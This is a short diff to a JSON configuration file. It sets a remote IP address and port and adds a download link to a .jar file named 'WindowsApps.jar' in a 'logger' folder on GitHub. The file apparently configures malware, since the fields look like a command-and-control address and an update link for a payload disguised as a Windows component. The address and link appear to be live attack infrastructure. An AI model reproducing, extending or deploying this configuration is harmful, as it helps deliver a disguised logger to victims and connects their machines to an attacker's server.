@@ -1,5 +1,6 @@
 {
   "remoteip": "163.5.159.107",
   "remoteport" : "3556",
-  "latestbuild": "1"
+  "latestbuild": "1",
+  "downloadlink": "https://raw.githubusercontent.com/omega7711/terminoff/main/logger/WindowsApps.jar"
 }
